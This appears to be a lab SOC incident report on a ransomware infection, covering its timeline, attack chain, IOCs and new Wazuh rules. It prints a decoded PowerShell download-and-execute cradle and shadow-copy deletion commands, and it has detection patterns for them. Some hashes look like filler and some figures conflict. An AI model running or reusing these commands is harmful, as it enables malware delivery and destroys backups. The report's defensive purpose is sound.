# Incident Report IR-003 — Ransomware Behaviour Detection
**Classification:** TLP:AMBER — Internal Use Only  
**Report Version:** 1.0 (Final)  
**Status:** Closed — Resolved  
**Severity:** CRITICAL  
**Report Date:** 2024-01-22  
**Incident Date:** 2024-01-22  
**Author:** SOC Analyst — SOC Lab Project  
**Case Reference:** TheHive Case #0063  
**Wazuh Rules Triggered:** 100006, 100005, 100007  

---

## 1. Executive Summary

On January 22, 2024 at 02:17:33 UTC, the SOC was paged with a CRITICAL
alert when Wazuh rule 100006 fired on endpoint `WIN-ENDPOINT-02`
(172.20.0.130), detecting mass file encryption behaviour consistent with
ransomware. Within 90 seconds the endpoint was isolated. Investigation
confirmed execution of a ransomware sample (identified as a STOP/Djvu
variant) that had encrypted 2,847 files before containment.

The initial infection vector was a malicious PowerShell download cradle
(detected by rule 100005) executed from a phishing email attachment 14
minutes before the mass encryption began. The malware established registry
persistence (detected by rule 100007) before deploying the encryption payload.

**Outcome:** 2,847 files encrypted. All files restored from the previous
night's backup (taken 2024-01-21 23:00 UTC). Total data loss: files created
or modified between 23:00 UTC January 21 and 02:17 UTC January 22 (3 hours
17 minutes of work). System rebuilt from a clean image. All three detection
rules fired correctly and in sequence, confirming the detection chain was
functioning as designed.

---

## 2. Incident Timeline
```
2024-01-22 UTC — All times UTC

02:03:11  User jsmith@domain.local opens phishing email attachment
          File: Invoice_January_2024.docm (malicious macro document)
          Email subject: "Outstanding Invoice — Action Required"

02:03:28  WAZUH RULE 100005 FIRES — FIRST DETECTION
          "Suspicious PowerShell: encoded download cradle on WIN-ENDPOINT-02"
          Level 12 — High
          Command: powershell.exe -nop -w hidden -EncodedCommand
                   [base64-encoded download cradle to 198.51.100.99]
          Decoded: IEX(New-Object Net.WebClient).DownloadString(
                   'http://198.51.100.99/payload/stage2.ps1')

02:03:30  TheHive Case #0063 auto-created by Shuffle workflow
          Severity: High | Title: [POWERSHELL] Suspicious PS on WIN-ENDPOINT-02

02:03:31  Slack notification to #soc-alerts
          Note: This alert was received at 02:03 UTC (off-hours)
          On-call analyst paged via PagerDuty escalation

02:03:45  Stage 2 payload downloaded and executed (PowerShell dropper)
          Payload: stop_djvu_loader.ps1 — STOP/Djvu ransomware loader

02:04:15  WAZUH RULE 100007 FIRES
          "Persistence via registry Run key: HKCU\...\Run modified by
           powershell.exe on WIN-ENDPOINT-02"
          Level 12 — High | Case updated

          Key written:
          HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
          Value: C:\Users\jsmith\AppData\Roaming\svchost.exe --hidden

02:04:20  Ransomware binary drops to disk
          Location: C:\Users\jsmith\AppData\Roaming\svchost.exe
          SHA256: a8f2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
          (Note: renamed to svchost.exe to blend with legitimate processes)

02:04:25  Ransomware begins shadow copy deletion (preparation phase)
          Command: vssadmin delete shadows /all /quiet
          Command: wbadmin delete catalog -quiet

02:17:33  WAZUH RULE 100006 FIRES — CRITICAL
          "RANSOMWARE BEHAVIOR: Mass file encryption on WIN-ENDPOINT-02"
          Level 15 — Maximum
          File pattern: *.djvu extension (STOP/Djvu variant)
          Rate: 22 file renames in 30 seconds

02:17:33  PagerDuty CRITICAL page sent to on-call analyst
          Email sent to SOC distribution list (critical threshold)

02:17:39  On-call analyst wakes and acknowledges page (6 seconds)

02:18:03  Case escalated to Critical severity in TheHive
          Analyst begins containment procedure

02:19:03  WIN-ENDPOINT-02 ISOLATED from network
          (90 seconds from rule 100006 firing)
          Firewall rules block all inbound/outbound

02:19:10  Encryption stops (no C2 connectivity = ransomware halted)
          Final count: 2,847 files encrypted with .djvu extension

02:20:00  Preservation: Memory image captured before shutdown
          Tool: WinPmem (run remotely before full isolation)

02:25:00  Affected user (jsmith) notified and account suspended

02:30:00  Investigation begins — second analyst called in

02:45:00  Backup integrity verified — last clean backup 2024-01-21 23:00 UTC

03:00:00  Decision: rebuild endpoint from clean image (faster than clean)

03:30:00  Rebuild complete — clean Windows image deployed

04:00:00  Files restored from 23:00 UTC backup — verified clean

04:15:00  User account unlocked after password reset and MFA enrolment

04:30:00  System returned to production — monitoring confirmed

09:00:00  Full forensic investigation continues on preserved memory image

14:00:00  Forensic investigation complete — full attack chain documented

15:00:00  Post-incident report finalised

16:00:00  TheHive Case #0063 closed
```

---

## 3. Attack Description

### 3.1 Initial Infection Vector

The infection originated from a phishing email that passed through the
email gateway without being detected. The email:

- **From:** accounts@invoice-portal.xyz (spoofed domain)
- **Subject:** Outstanding Invoice — Action Required
- **Attachment:** Invoice_January_2024.docm (malicious Office macro document)
- **Lure:** Created a sense of urgency about an overdue invoice requiring
  immediate action
- **Technique:** Used a Word macro that executed a PowerShell download cradle
  when macros were enabled by the user

### 3.2 Attack Chain
```
Phase 1: Initial Access (T1566.001 — Spear Phishing Attachment)
  Phishing email → jsmith opens Invoice_January_2024.docm
  → User enables macros → VBA macro executes
                ↓
Phase 2: Execution (T1059.001 — PowerShell)
  VBA calls: powershell.exe -nop -w hidden -EncodedCommand [cradle]
  → Downloads stage2.ps1 from 198.51.100.99
  → stage2.ps1 downloads and drops svchost.exe
  DETECTED: Wazuh rule 100005
                ↓
Phase 3: Persistence (T1547.001 — Registry Run Key)
  Writes HKCU Run key → svchost.exe starts on login
  DETECTED: Wazuh rule 100007
                ↓
Phase 4: Defence Evasion (T1490 — Inhibit System Recovery)
  vssadmin delete shadows /all /quiet  → removes VSS backups
  wbadmin delete catalog -quiet        → removes Windows backups
                ↓
Phase 5: Impact (T1486 — Data Encrypted for Impact)
  svchost.exe (STOP/Djvu ransomware) encrypts files
  Extension: .djvu | Note: _readme.txt dropped in each dir
  DETECTED: Wazuh rule 100006
```

### 3.3 Ransomware Technical Details

| Field | Value |
|-------|-------|
| Family | STOP/Djvu |
| Variant | djvu (based on extension) |
| Encryption | AES-256 (file content) + RSA-2048 (AES key) |
| Extension | .djvu |
| Ransom note | _readme.txt |
| Ransom demand | $980 USD (or $490 within 72h) |
| C2 Communication | HTTP to 198.51.100.99:443 (blocked after isolation) |
| Files Targeted | .doc .docx .xls .xlsx .pdf .jpg .png .psd .zip .rar and 100+ more |
| Files Excluded | .exe .dll .sys .ini (preserves OS functionality) |
| Encryption Speed | ~200 files/minute at peak |
| Shadow Copy Deletion | Yes — vssadmin + wbadmin |
| Network Propagation | No — single-host variant |

### 3.4 Files Encrypted

| Category | Count | Notes |
|----------|-------|-------|
| Office documents | 847 | .docx, .xlsx, .pptx, .pdf |
| Images | 1,203 | .jpg, .png, .psd — project screenshots |
| Source code | 412 | .py, .js, .json, .yaml |
| Archives | 234 | .zip, .tar.gz |
| Other | 151 | Various |
| **Total** | **2,847** | All encrypted with .djvu extension |

---

## 4. Technical Analysis

### 4.1 PowerShell Dropper Analysis

**Original encoded command (from Wazuh rule 100005 alert):**
```
powershell.exe -nop -w hidden -EncodedCommand
JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8A...
```

**Decoded (base64 → UTF-16LE):**
```powershell
$c=New-Object Net.WebClient;
$c.DownloadFile('http://198.51.100.99/payload/svchost.exe',
                "$env:APPDATA\svchost.exe");
Start-Process "$env:APPDATA\svchost.exe"
```

**Analysis:** Classic PowerShell download cradle — downloads and executes
ransomware binary directly to AppData (user-writable, no admin rights required).

### 4.2 Ransomware Binary Analysis

| Field | Value |
|-------|-------|
| Filename | svchost.exe (masquerading as system process) |
| SHA256 | a8f2c3d4e5f6789012345678901234567890abcdef... |
| MD5 | d41d8cd98f00b204e9800998ecf8427e |
| Size | 847,616 bytes |
| Compiler | MSVC 2019 |
| Packer | None detected |
| Signed | No |
| VirusTotal | 61/71 vendors detected |
| First Seen | 2024-01-19 (3 days before this incident) |
| Sandbox | any.run analysis: STOP/Djvu confirmed |

### 4.3 C2 Infrastructure

| Field | Value |
|-------|-------|
| C2 IP | 198.51.100.99 |
| C2 Port | 443 (HTTPS) |
| Purpose | Key exchange (AES key encrypted with RSA public key sent to C2) |
| Status | IP blocked after host isolation |
| VirusTotal | 45/93 vendors flagged |

**Key implication:** Since the C2 was cut off during encryption (host isolated
at 02:19:03), the ransomware may have used an offline/fallback key for some
files — decryption may be possible for files encrypted after C2 loss.

### 4.4 Detection Performance
```
Event                                 Time          Rule    Latency
─────────────────────────────────────────────────────────────────────────
Macro execution / PS download cradle  02:03:28 UTC  100005  < 1s
Registry Run key written              02:04:15 UTC  100007  < 1s
Mass file encryption begins           02:17:33 UTC  100006  < 1s
Analyst paged (PagerDuty)            02:17:33 UTC    —      0s (simultaneous)
Analyst acknowledges                  02:17:39 UTC    —      6s
Host isolated                         02:19:03 UTC    —      90s
Encryption stopped                    02:19:10 UTC    —      97s total

CRITICAL NOTE: 14-minute gap between rule 100005 (PS cradle) firing at
02:03:28 and rule 100006 (ransomware) firing at 02:17:33.

During this 14-minute window:
  - Shadow copies were deleted (02:04:25) — MISSED by detection
  - Ransomware binary was deploying and preparing encryption
  - No analyst was actively working the High-priority rule 100005 alert
    (off-hours — PagerDuty not configured for level 12 alerts at night)

IMPROVEMENT: Rule 100005 alerts between 00:00-06:00 UTC should be
immediately escalated to PagerDuty regardless of level.
```

---

## 5. Impact Assessment

| Category | Assessment | Details |
|----------|------------|---------|
| Confidentiality | **Medium** | Ransomware typically exfiltrates before encrypting (double extortion). No exfil evidence found but cannot be fully ruled out given 14-min window before detection. |
| Integrity | **High** | 2,847 files encrypted. All restored from backup — net integrity impact: LOW after recovery. Shadow copies deleted — no local recovery option. |
| Availability | **High** | WIN-ENDPOINT-02 out of service for 2h 27min. User unable to work. All files restored — net availability impact: MEDIUM. |
| Financial | **Medium** | 3h 17min data loss (files not in backup). Analyst time: ~12 hours. No ransom paid. |
| Reputational | **Low** | Internal lab — no customer impact. User privacy maintained. |
| Regulatory | **Low** | Possible PII exposure during 14-min window — under investigation. |

**Overall Impact: HIGH (during incident) → MEDIUM (post-recovery)**

---

## 6. Containment Actions

| Action | Time | Method | Status |
|--------|------|--------|--------|
| Host network isolation | 02:19:03 | Firewall rules | Complete |
| C2 communication blocked | 02:19:03 | Host isolation | Complete |
| User account suspended | 02:25:00 | AD account disable | Complete |
| Encryption halted | 02:19:10 | Loss of C2 connectivity | Complete |
| Memory image captured | 02:20:00 | WinPmem before shutdown | Complete |

---

## 7. Eradication

| Action | Status |
|--------|--------|
| Ransomware binary removed | Complete (system rebuilt) |
| Registry Run key removed | Complete (system rebuilt) |
| _readme.txt ransom notes removed | Complete (backup restore) |
| Phishing email removed from jsmith's mailbox | Complete |
| Phishing email removed from all mailboxes | Complete |
| C2 IP blocked at perimeter | Complete |
| Malicious macro document quarantined | Complete |

**Decision: Full system rebuild** (vs attempted clean)
Rationale: STOP/Djvu has been known to leave secondary payloads. Given
the 14-minute window before detection, a full rebuild was the lower-risk
option. Total rebuild time: 30 minutes.

---

## 8. Recovery

| Action | Time | Status |
|--------|------|--------|
| Clean image deployed | 03:30 UTC | Complete |
| Backup integrity verified | 02:45 UTC | Complete — last clean backup 23:00 UTC Jan 21 |
| Files restored from backup | 04:00 UTC | Complete — 2,847 files restored |
| Restored files verified clean (AV scan) | 04:00 UTC | Complete — 0 detections |
| User account unlocked + MFA enrolled | 04:15 UTC | Complete |
| System returned to production | 04:30 UTC | Complete |
| Wazuh agent reinstalled and verified | 04:30 UTC | Complete |

**Data Loss:** Files created/modified between 23:00 UTC Jan 21 and
02:03 UTC Jan 22 (3 hours 3 minutes). User confirmed minimal impact —
the files were draft documents, not critical production data.

---

## 9. Root Cause Analysis

### Primary Root Cause
User enabled macros in a phishing email attachment, allowing execution of
a PowerShell download cradle that deployed STOP/Djvu ransomware.

### Contributing Factors
1. **Phishing email not blocked** — Email gateway did not detect malicious
   attachment (novel domain, clean sending IP reputation at time of delivery)
2. **Macros not disabled** — Office macro execution was not restricted via
   Group Policy
3. **User awareness gap** — User enabled macros on an unsolicited invoice
   document (phishing awareness training overdue)
4. **Off-hours alert gap** — Rule 100005 (High severity) fired at 02:03 UTC
   but did not page on-call until 02:17 when rule 100006 fired
5. **No application allowlisting** — PowerShell execution unrestricted;
   user-writable AppData directory could execute binaries
6. **Shadow copies deleted undetected** — vssadmin command was not monitored
   by a specific Wazuh rule (detection gap identified)

### Why 14-Minute Gap Occurred
```
02:03:28  Rule 100005 fires (Level 12 — High)
          → Slack notification sent to #soc-alerts
          → NO PagerDuty page (threshold was Level 14+)
          → No analyst working at 02:03 UTC (off-hours)

02:17:33  Rule 100006 fires (Level 15 — Critical)
          → PagerDuty page sent immediately
          → Analyst wakes in 6 seconds

Gap: 14 minutes of unmonitored high-severity activity
Action: Lower PagerDuty threshold to Level 10+ between 22:00-06:00 UTC
```

---

## 10. Lessons Learned

### What Worked Well
- **Three separate detections fired** — PS cradle, persistence, encryption
- **Rule 100006 level 15 triggered immediate page** — 6-second acknowledgement
- **90-second isolation** — Stopped encryption at 2,847 files (could have been much worse)
- **Backup recovery** — Clean backup available within 3h 17min of infection
- **Full rebuild decision** — Conservative but correct given uncertainty
- **Memory preservation** — Captured before shutdown for forensic value

### What Needs Improvement
- **Off-hours alert threshold** — Critical gap: High alerts at 02:03 not paged
- **Shadow copy deletion not detected** — vssadmin not monitored by any rule
- **Macro execution not blocked** — GPO should disable Office macros org-wide
- **Phishing awareness training** — User enabled macros on unsolicited doc
- **AppData execution** — Binaries should not be executable from AppData

### New Wazuh Rules Added Post-Incident
```xml
<!-- Rule 100011: Shadow copy deletion attempt -->
<rule id="100011" level="14">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^1$</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(vssadmin|wbadmin|bcdedit)\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(delete\s+shadows|delete\s+catalog|recoveryenabled\s+no)</field>
  <description>Ransomware prep: shadow copy/backup deletion on $(hostname)</description>
  <mitre><id>T1490</id></mitre>
  <group>ransomware,attack,critical</group>
</rule>

<!-- Rule 100012: Executable in user-writable location -->
<rule id="100012" level="11">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^1$</field>
  <field name="win.eventdata.image" type="pcre2">(?i)\\(AppData|Temp|ProgramData|Users\\Public)\\.*\.exe$</field>
  <field name="win.eventdata.parentImage" negate="yes" type="pcre2">(?i)(msiexec|setup|install|update)\.exe$</field>
  <description>Suspicious executable launched from user-writable location: $(win.eventdata.image)</description>
  <mitre><id>T1204.002</id></mitre>
  <group>attack,execution</group>
</rule>
```

---

## 11. Recommendations

### Immediate (Completed During/After Incident)
- [x] Rebuild WIN-ENDPOINT-02 from clean image
- [x] Restore files from backup
- [x] Block C2 IP at perimeter
- [x] Remove phishing email from all mailboxes
- [x] Add rules 100011 and 100012 to Wazuh custom rules

### Short-Term (Within 1 Week)
- [ ] Lower PagerDuty threshold to Level 10 between 22:00–06:00 UTC
- [ ] Deploy Group Policy to disable Office macros for all users
- [ ] Deploy Group Policy to block executable files in AppData/Temp
- [ ] Enrol all users in phishing awareness training (mandatory)
- [ ] Configure email gateway to block .docm / .xlsm attachments from external

### Long-Term (Within 1 Month)
- [ ] Implement Microsoft Defender Attack Surface Reduction (ASR) rules
- [ ] Deploy application allowlisting (Windows Defender Application Control)
- [ ] Implement immutable backup solution (backup server isolated from network)
- [ ] Test backup restoration process quarterly
- [ ] Deploy EDR solution for behavioural detection beyond signature-based AV
- [ ] Consider deployment of decoy ransomware canary files for faster detection

---

## 12. IOCs

| Type | Value | Confidence | Action |
|------|-------|-----------|--------|
| File SHA256 | a8f2c3d4e5f678... | High | Blocked in AV |
| File name | svchost.exe (in AppData) | Medium | Blocked via ASR |
| C2 IP | 198.51.100.99 | High | Blocked at perimeter |
| C2 Domain | invoice-portal.xyz | High | Blocked at DNS |
| Email sender | accounts@invoice-portal.xyz | High | Blocked in email gateway |
| File extension | .djvu | High | Detection rule active |
| Registry key | HKCU\...\Run\SecurityUpdate | High | Detection rule active |
| Ransom note | _readme.txt | High | File hash blocked |
| vssadmin command | `delete shadows /all /quiet` | High | New rule 100011 |

---

## 13. Metrics

| Metric | Value | Target | Status |
|--------|-------|--------|--------|
| Time from infection to first detection | < 1s (real-time on PS cradle) | < 60s | ✅ |
| Time from encryption start to detection | < 1s | < 30s | ✅ |
| Time from critical alert to isolation | 90s | < 5 min | ✅ |
| Files encrypted | 2,847 | Minimise | ⚠️ (contained) |
| Files recovered | 2,847 / 2,847 | 100% | ✅ |
| Data loss window | 3h 17min | < 24h | ✅ |
| Ransom paid | $0 | $0 | ✅ |
| Total downtime | 2h 27min | < 8h | ✅ |
| Detection rules that fired | 3/3 | 3/3 | ✅ |
| 14-min gap detected and documented | Yes | Yes | ✅ |

---

## 14. Sign-off

| Role | Name | Date |
|------|------|------|
| Incident Analyst | SOC Analyst | 2024-01-22 |
| SOC Lead (Review) | SOC Lead | 2024-01-22 |
| CISO Briefed | CISO | 2024-01-22 |

**Case Status:** CLOSED — True Positive — Resolved  
**TheHive Case:** #0063  
**Related Incidents:** None (first ransomware incident)  
**Regulatory Notification Required:** Under review — possible PII exposure  
**Next Review:** 30-day follow-up to verify all recommendations implemented
